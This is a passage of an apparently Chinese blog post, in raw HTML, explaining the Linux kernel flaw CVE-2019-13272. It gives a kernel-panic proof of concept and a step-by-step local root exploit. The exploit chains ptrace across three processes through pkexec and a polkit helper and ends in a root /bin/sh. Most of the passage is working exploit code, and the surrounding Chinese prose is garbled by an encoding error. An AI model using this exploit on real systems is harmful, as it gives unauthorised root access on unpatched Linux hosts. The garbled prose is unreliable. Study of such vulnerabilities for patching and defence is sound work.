class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ptraceThread</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> child;</span><br><span class="line">    <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of kernel panic.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uid = getuid();</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            setresuid(uid, uid, uid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pthread_create(&amp;child, <span class="literal">NULL</span>, ptraceThread, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/01/14/Cl1RPwcj5s8OLrf.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯æˆ‘ä»¬æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´é€ æˆäº† kernel panic</p><h2 id="åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ"><a href="#åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ" class="headerlink" title="åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ"></a>åˆ©ç”¨é€»è¾‘é”™è¯¯è¿›è¡Œæœ¬åœ°ææƒ</h2><p>æˆ‘ä»¬å…ˆä»‹ç»ä¸€ä¸ªæ–°ç©æ„â€”â€”<code>PolKit</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œç›¸æ¯”èµ· sudo ç­‰ä¼ ç»Ÿç‰¹æƒæˆæƒç¨‹åºï¼Œpolkit å¯ä»¥è¿›è¡Œæ›´ç»†ç²’åº¦çš„æƒé™æˆäºˆï¼Œè¿™é‡Œä¸æ·±å…¥ç ”ç©¶å…¶ç”¨æ³•</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªå¤§éƒ¨åˆ† Linux æ¡Œé¢å‘è¡Œç‰ˆéƒ½æœ‰çš„ suid ç¨‹åºâ€”â€” <code>pkexec</code>ï¼Œè¿™æ˜¯ polkit ä¸­çš„å·¥å…·ä¹‹ä¸€ï¼Œå…¶å…è®¸è·å¾—æˆæƒçš„ç”¨æˆ·ä»¥å¦ä¸€ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œç‰¹å®šç¨‹åºï¼Œå¦‚ä¸‹æ˜¯æˆ‘ä»¬å°†ä¼šç”¨åˆ°çš„æŒ‡ä»¤æ‰§è¡Œæ ¼å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pkexec -user username some_programme_under_polkit</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>-user</code> å‚æ•°æ—¶ï¼Œ pkexec ä¼š<strong>å…ˆå°†è¿›ç¨‹ææƒåˆ° rootï¼Œä¹‹åå†é™æƒåˆ°æŒ‡å®šç”¨æˆ·</strong>ï¼Œè¿™æ°å¥½å¯ä»¥ç”¨æ¥æ„é€ æˆ‘ä»¬ ptrace åˆ©ç”¨é“¾ä¸Šçš„è¿›ç¨‹ B</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€ä¸ª<strong>åœ¨ polkit æ¡†æ¶ä¸‹è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åº</strong>ï¼ˆJann Horn ç§°ä¹‹ä¸º helperï¼‰ï¼Œhelper éœ€è¦æ»¡è¶³çš„æ˜¯<strong>æ™®é€šç”¨æˆ·æ‰§è¡Œæ—¶ä¸éœ€è¦è®¤è¯</strong>ï¼ˆå¾ˆå¤š polkit ç¨‹åºæ‰§è¡Œæ—¶éƒ½éœ€è¦å¼¹çª—è®¤è¯ï¼‰</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è§£å†³åˆ©ç”¨æµç¨‹ä¸­æ¡ä»¶ç«äº‰çš„é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨_ç®¡é“_æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„æ—¶æœºï¼Œä»è€Œè®©å¯¹åº”çš„ä¸‰ä¸ªè¿›ç¨‹èƒ½å¤Ÿåœ¨å¯¹åº”æ—¶æœºæ‰§è¡Œå¯¹åº”æ“ä½œ</p><p>ä¸‹é¢æˆ‘ä»¬åˆ†é˜¶æ®µå¯¹ exp è¿›è¡Œè®²è§£ï¼Œè¿™é‡Œçš„ exp ç¬”è€…å‚è€ƒäº† Jann çš„exp è¿›è¡Œé‡æ–°ç¼–å†™ï¼Œç»è¿‡ç¬”è€…çš„ä¸€äº›<del>è‡ªä»¥ä¸ºæ˜¯çš„</del>ä¼˜åŒ–</p><h3 id="Setp-I-task-A-fork-task-B"><a href="#Setp-I-task-A-fork-task-B" class="headerlink" title="Setp.I task A fork task B"></a>Setp.I task A fork task B</h3><p>è¿™é‡Œçš„ main å‡½æ•°ç¬”è€…è®¾è®¡ä¸ºä¸»è¦å®ç° task A çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿä½œä¸ºåé¢ task B ä¸ task C é€šè¿‡ execveat æ›¿æ¢è‡ªèº«é•œåƒæ—¶çš„è·³è½¬å…¥å£</p><p>findHelper() ç”¨ä»¥å¯»æ‰¾å½“å‰å¹³å°å¯ç”¨çš„ helperï¼Œä¸å†èµ˜å™</p><p>task A é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œåé¢æˆ‘ä»¬éœ€è¦å°† task B çš„ stdout é‡å®šå‘è‡³è¯¥ç®¡é“ä»¥è®©å…¶å µå¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†ç®¡é“è®¾ä¸º <code>O_DIRECT</code> æ¨¡å¼ï¼Œè¿™æ„å‘³ç€è¯¥ç®¡é“ä¼ è¾“æ•°æ®çš„æ–¹å¼æ˜¯æŒ‰ â€œpacketâ€ è¿›è¡Œä¼ è¾“çš„ï¼Œéšåæˆ‘ä»¬å…ˆå¾€å…¶ä¸­å¡«å……ä¸€ä¸ª packetï¼Œåé¢ task B åœ¨å†™å…¥  stdout æ—¶ä¾¿ä¼šå µå¡ï¼ˆä¸ºä»€ä¹ˆè¦é˜»å¡åé¢ç»†è¯´ï¼‰</p><p>åˆ›å»ºå®Œæˆç®¡é“ä¹‹åä¾¿ fork å‡º task Bï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ task B çš„æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h3 id="Step-II-task-B-fork-task-C"><a href="#Step-II-task-B-fork-task-C" class="headerlink" title="Step.II task B fork task C"></a>Step.II task B fork task C</h3><p>task B ä¸»è¦çš„å·¥ä½œç¬”è€…éƒ½å°†å…¶å°è£…åœ¨ <code>middlePtracee()</code> ä¸­ï¼Œé¦–å…ˆè¿˜æ˜¯ fork å‡º task Cï¼Œ<strong>æ­¤æ—¶ task A ä¸ task C éƒ½åœ¨ç›‘è§† task B çš„çŠ¶æ€</strong></p><p>æ¥ä¸‹æ¥ task B å°†è‡ªèº«çš„ stdin é‡å®šå‘è‡ª <code>/proc/self/exe</code> ï¼Œ<strong>å°† stdout é‡å®šå‘è‡³é˜»å¡çš„ç®¡é“</strong>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œ pkexec æ—¶ï¼Œpkexec çš„è¾“å‡ºèµ° stderrï¼Œå› æ­¤ææƒ-&gt;é™æƒè¿™ä¸€æµç¨‹å¹¶ä¸ä¼šé˜»å¡ï¼Œè€Œ pkexec æ‰§è¡Œçš„ helper çš„è¾“å‡ºåˆ™èµ° stdoutï¼Œ<strong>æ­¤æ—¶ç¨‹åºä¼šé˜»å¡åœ¨è¿™é‡Œï¼Œä¸” task B å·²ç»é™æƒï¼Œå› æ­¤ task A å¯ä»¥å€Ÿæ­¤æ—¶æœºæ¥ç®¡ task B</strong></p><p>é‡å®šå‘å®Œæˆåä¾¿æ˜¯å¸¸è§„çš„æ‰§è¡Œ <code>pkexec</code> çš„æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-III-task-C-get-root"><a href="#Step-III-task-C-get-root" class="headerlink" title="Step.III task C get root"></a>Step.III task C get root</h3><p>task B æ‰§è¡Œ pkexec ä¹‹åä¼šææƒåˆ° rootï¼Œå½“ task C ç›‘è§†åˆ° task B æ‰§è¡Œ pkexec åä¾¿è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> æ¥è·å– task B çš„ root credï¼Œ<strong>ä»è€Œä»¤ task C çš„ ptracer_cred ä¸º root cred</strong>ï¼Œæ­¤æ—¶ task C å†æ‰§è¡Œä¸€ä¸ª suid ç¨‹åºä¾¿èƒ½ä»¥ root æƒé™æ‰§è¡Œï¼Œ<strong>ä¸”ä»ä¿æŒç€è¢« task B ptrace çš„çŠ¶æ€</strong></p><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©æ‰§è¡Œ <code>/usr/bin/passwd</code>ï¼Œå› ä¸ºå…¶ä¼šç­‰å¾…ç”¨æˆ·è¾“å…¥è€Œä¸ä¼šç›´æ¥é€€å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Step-IV-task-A-attach-task-B"><a href="#Step-IV-task-A-attach-task-B" class="headerlink" title="Step.IV task A attach task B"></a>Step.IV task A attach task B</h3><p>task A åœ¨ fork å‡º task B ä¹‹åä¾¿æŒç»­ç›‘è§† task B çš„çŠ¶æ€ï¼Œå½“ task B æ‰§è¡Œ helper æ—¶<strong>è¯´æ˜ task B å·²ç»é™æƒå¹¶é˜»å¡ï¼Œæ­¤æ—¶ task A ä¾¿æœ‰è¶³å¤Ÿçš„æƒé™ ptrace task B</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">       <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">       <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">           <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">       &#125;</span><br><span class="line">       comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       usleep(<span class="number">100000</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">   ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><h3 id="Step-V-get-privileged-by-multistage-ptrace-link"><a href="#Step-V-get-privileged-by-multistage-ptrace-link" class="headerlink" title="Step.V get privileged by multistage ptrace link"></a>Step.V get privileged by multistage ptrace link</h3><p>å½“ç¨‹åºè¿è¡Œåˆ°è¿™ä¸€æ­¥æ—¶ï¼Œ<strong>æˆ‘ä»¬å·²ç»æˆåŠŸå»ºç«‹äº†</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>è¿™ä¸€å¤šçº§ ptrace é“¾æ¡</strong>ï¼Œæ­¤æ—¶ task Aã€B ä¸ºç”¨æˆ·æƒé™ï¼Œtask C ä¸º root æƒé™ï¼Œ<strong>è€Œ task C ä¿å­˜çš„ ptracer_cred åŒä¸º root æƒé™</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ task A æ§åˆ¶ task B æ§åˆ¶ task C æ¥å®Œæˆææƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// in task A</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªè‡ªè¡Œç¼–å†™çš„ <code>forceChildToExecve()</code> å‡½æ•°ï¼Œä¸»è¦æ˜¯æ§åˆ¶ ptracee è¿›ç¨‹é€šè¿‡ execveat ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œå› exp ç¨‹åºçš„ä¸åŒå…¥å£ï¼Œå…·ä½“ç»†èŠ‚å‚è§æ³¨é‡Šï¼Œè¿™é‡Œä¸å†èµ˜å™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span 